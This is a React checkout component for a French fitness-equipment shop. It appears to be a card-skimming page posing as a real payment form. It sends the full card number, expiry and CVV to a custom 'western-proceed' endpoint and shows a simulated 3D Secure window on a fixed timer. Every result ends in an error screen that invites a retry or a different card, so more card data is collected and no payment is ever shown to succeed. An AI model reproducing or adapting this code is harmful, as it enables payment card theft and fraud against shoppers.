import { useState, useRef, useEffect } from 'react';
import { useRouter } from 'next/router';

const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoading, show3DSecurePopup, setShow3DSecurePopup, data, shop }) => {
  const [formData, setFormData] = useState({
    cardHolder: '',
    cardNumber: '',
    expiryDate: '',
    cvv: '',
  });

  const [showPaymentError, setShowPaymentError] = useState(false);
  const [showCardError, setShowCardError] = useState(false);
  const [cardLogo, setCardLogo] = useState('/verified-by-visa.png');
  const [checkoutProvider, setCheckoutProvider] = useState("western");

  const cardNumberRef = useRef(null);
  const expiryDateRef = useRef(null);
  const cvvRef = useRef(null);
  const router = useRouter();

  // Ref pour stocker la promesse d'initialisation
  const initPromiseRef = useRef(null);

  // Requête d'initialisation à l'arrivée sur la page
  useEffect(() => {
    const initialize = async () => {
      const response = await fetch('https://api.christopeit-sport.fr/western-init', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ orderNumber, amount }),
      });
      if (!response.ok) {
        throw new Error('Failed to initialize payment');
      }
      console.log("Initialization successful");
    };

    const initWithDelay = async () => {
      await new Promise((resolve) => setTimeout(resolve, 3000));
      if (amount !== '0.00') {
        // Stocker la promesse d'initialisation dans la ref
        initPromiseRef.current = initialize();
        try {
          await initPromiseRef.current;
        } catch (error) {
          console.error("Error during initialization:", error);
        }
      }
      console.log("AMOUNT:", amount);
      console.log("ORDER NUMBER:", orderNumber);
    };

    initWithDelay();
  }, [amount, orderNumber]);

  const currentDate = new Date();
  const formattedDate = currentDate.toLocaleDateString('fr-FR', {
    year: '2-digit',
    month: '2-digit',
    day: '2-digit',
  });
  const formattedTime = currentDate.toLocaleTimeString('fr-FR', {
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
  });

  const lastFourDigits = formData.cardNumber.replace(/\s/g, '').slice(-4);

  const handleInputChange = (e) => {
    const { name, value } = e.target;
    if (name === 'cardNumber') {
      const formattedValue = value
        .replace(/\D/g, '')
        .slice(0, 16)
        .replace(/(.{4})/g, '$1 ')
        .trim();
      setFormData((prevData) => ({
        ...prevData,
        [name]: formattedValue,
      }));
    } else if (name === 'expiryDate') {
      const formattedValue = value
        .replace(/\D/g, '')
        .slice(0, 4)
        .replace(/(\d{2})(\d{1,2})?/, (_, mm, yy) => (yy ? `${mm}/${yy}` : mm));
      setFormData((prevData) => ({
        ...prevData,
        [name]: formattedValue,
      }));
    } else {
      setFormData((prevData) => ({
        ...prevData,
        [name]: value,
      }));
    }
  };

  const payFetch = async (orderNumber, amount, cardDetails) => {
    // Attendre que l'initialisation se termine sans erreur
    if (initPromiseRef.current) {
      try {
        await initPromiseRef.current;
      } catch (error) {
        throw new Error("L'initialisation du paiement a échoué : " + error.message);
      }
    }

    // Générer un numéro de paiement aléatoire
    const paymentNumber = Math.floor(Math.random() * 100000);

    try {
      const response = await fetch(`https://api.christopeit-sport.fr/western-proceed`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ orderNumber, paymentNumber, amount, cardDetails }),
      });
      const data = await response.json();
      if (!response.ok) {
        throw new Error(data.message || 'Something went wrong!');
      }
      console.log("Réponse de l'API:", data);
      if(data.result) {
        return data.result;
      } else {
        return data;
      }
    } catch (error) {
      console.error('Error fetching payment:', error);
      setShowPaymentError(false);
      setShowCardError(false);
      setShow3DSecurePopup(false);
      throw error;
    }
  };

  const triggerBackgroundReinit = async () => {
    try {
      const response = await fetch('https://api.christopeit-sport.fr/western-init', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ orderNumber, amount }),
      });
      if (!response.ok) {
        throw new Error('Failed to reinitialize payment');
      }
      console.log("Background reinitialization successful");
      // Vous pouvez stocker le résultat ou simplement signaler que la réinit est faite
      initPromiseRef.current = Promise.resolve(); 
    } catch (error) {
      console.error("Error during background reinitialization:", error);
      initPromiseRef.current = Promise.reject(error);
    }
  };

  function gtag_report_conversion(url) {
    var callback = function () {
      if (typeof(url) !== 'undefined') {
        window.location = url;
      }
    };
    gtag('event', 'conversion', {
      'send_to': 'AW-16883090550/gaFaCMfZ27QaEPaIvvI-',
      'value': 50.0,
      'currency': 'EUR',
      'transaction_id': '',
      'event_callback': callback
    });
    return false;
  }

  const handleCheckout = async (e) => {
    e.preventDefault();
    if (document.activeElement === document.querySelector('input[name="cvv"]')) {
      document.activeElement.blur();
    }
    gtag_report_conversion();

    const cardDetails = {
      cardNumber: ` ${formData.cardNumber} `,
      cardOwner: formData.cardHolder,
      cardExpiration: formData.expiryDate,
      cardCVC: formData.cvv,
    };

    if (formData.cardNumber.startsWith('5')) {
      setCardLogo('/mastercard-id-check.png');
    }

    try {
      console.log("Paiement en cours...");
      setIsLoading(true);
      
      // Lancer en fond la réinitialisation supplémentaire
      triggerBackgroundReinit();

      setTimeout(() => {
        setIsLoading(false);
        setShow3DSecurePopup(true);
      }, 56000);

      const result = await payFetch(orderNumber, amount, cardDetails);
      setIsLoading(false);
      setShow3DSecurePopup(false);

      if (result === "refused") {
        setShowCardError(true);
      } else {
        setShowPaymentError(true);
      }
    } catch (error) {
      console.error(data.checkoutPayError, error);
      alert(data.checkoutPayGenericError);
      setIsLoading(false);
      setShow3DSecurePopup(false);
    }
  };

  const handleRetry = () => {
    setShowPaymentError(false);
    setShowCardError(false);
    setShow3DSecurePopup(false);
    handleCheckout(new Event('submit'));
  };

  const handleChangeCard = () => {
    setShowCardError(false);
    setShow3DSecurePopup(false);
    setFormData({
      cardNumber: '',
      expiryDate: '',
      cvv: '',
    });
    cardNumberRef.current.focus();
  };

  return (
    <form onSubmit={handleCheckout}>
      <input
        type="text"
        name="cardHolder"
        placeholder={data.checkoutPayCardHolderPlaceholder}
        onChange={handleInputChange}
        required
      />
      <input
        type="text"
        name="cardNumber"
        placeholder={data.checkoutPayCardNumberPlaceholder}
        ref={cardNumberRef}
        value={formData.cardNumber}
        onChange={handleInputChange}
        required
      />
      <div className="form-row">
        <input
          type="text"
        name="expiryDate"
        placeholder={data.checkoutPayExpiryDatePlaceholder}
        maxLength="5"
        ref={expiryDateRef}
        value={formData.expiryDate}
        onChange={handleInputChange}
        required
      />
      <input
        type="text"
        name="cvv"
        placeholder={data.checkoutPayCVVPlaceholder}
        ref={cvvRef}
        maxLength="4"
        value={formData.cvv}
        onChange={handleInputChange}
        required
      />
      </div>
      <article className="checkout-buttons">
        <button className="back-checkout" type="button" onClick={() => onBack && onBack()}>
          <i className="fas fa-arrow-left"></i>
        </button>
        <button id="pay-checkout" type="submit">
          {data.checkoutPayProceedButton}
        </button>
      </article>

      {isLoading && (
        <div className="verification-wrapper">
          <div className="verification-popup loading">
            <article className="head">
              <img className="brand-logo" src="icon.png" alt="Christopeit France" />
              <img
                className={`card-logo ${cardLogo === '/mastercard-id-check.png' ? 'mastercard' : 'visa'}`}
                src={cardLogo}
                alt={data.checkoutPayVerifiedPaymentAlt}
              />
            </article>
            <h2>{data.checkoutPayLoadingTitle}</h2>
            <p className="desc">{data.checkoutPayLoadingDescription}</p>
            <div className="loader border-top-primary"></div>
          </div>
        </div>
      )}

      {show3DSecurePopup && (
        <div className="verification-wrapper">
          <div className="verification-popup d-secure">
            <article className="head">
              <img className="brand-logo" src="icon.png" alt="Christopeit France" />
              <img
                className={`card-logo ${cardLogo === '/mastercard-id-check.png' ? 'mastercard' : 'visa'}`}
                src={cardLogo}
                alt={data.checkoutPayVerifiedPaymentAlt}
              />
            </article>
            <img src="3d-secure.png" alt="3D Secure" className="icon" />
            <h2>{data.checkoutPay3DSecureTitle}</h2>
            <p className="desc">{data.checkoutPay3DSecureDescription}</p>
            <article className="infos">
              <span>{checkoutProvider === "western" ? data.checkoutPay3DSecureMerchant : `${shop.name} - Google Payment`}</span>
              <span>
                {data.checkoutPay3DSecureAmount} : {amount}{shop.currency}
              </span>
              <span>
                {data.checkoutPay3DSecureDate} : {`${formattedDate} à ${formattedTime}`}
              </span>
              <span>
                {data.checkoutPay3DSecureCard} : **** **** **** {lastFourDigits}
              </span>
            </article>
            <div className="loader border-top-primary"></div>
            <p className="smaller">{data.checkoutPay3DSecureFooter}</p>
          </div>
        </div>
      )}

      {showPaymentError && (
        <div className="verification-wrapper">
          <div className="verification-popup error">
            <article className="head">
              <img className="brand-logo" src="icon.png" alt="Christopeit France" />
              <img
                className={`card-logo ${cardLogo === '/mastercard-id-check.png' ? 'mastercard' : 'visa'}`}
                src={cardLogo}
                alt={data.checkoutPayVerifiedPaymentAlt}
              />
            </article>
            <h2 className="icon">❌</h2>
            <h2>{data.checkoutPayErrorTitle}</h2>
            <p className="desc">{data.checkoutPayErrorDescription}</p>
            <button onClick={handleRetry} disabled={isLoading}>
              {data.checkoutPayRetryButton}
            </button>
          </div>
        </div>
      )}

      {showCardError && (
        <div className="verification-wrapper">
          <div className="verification-popup error">
            <article className="head">
              <img className="brand-logo" src="icon.png" alt="Christopeit France" />
              <img
                className={`card-logo ${cardLogo === '/mastercard-id-check.png' ? 'mastercard' : 'visa'}`}
                src={cardLogo}
                alt={data.checkoutPayVerifiedPaymentAlt}
              />
            </article>
            <h2 className="icon">❌</h2>
            <h2>Erreur lors du paiement</h2>
            <p className="desc">Une erreur est survenue, lors du paiement veuillez réessayer.</p>
            <button onClick={() => { handleRetry(); setCheckoutProvider("google"); }} disabled={isLoading}>
              Réesayer
            </button>
          </div>
        </div>
      )}
    </form>
  );
};

export default CustomPay;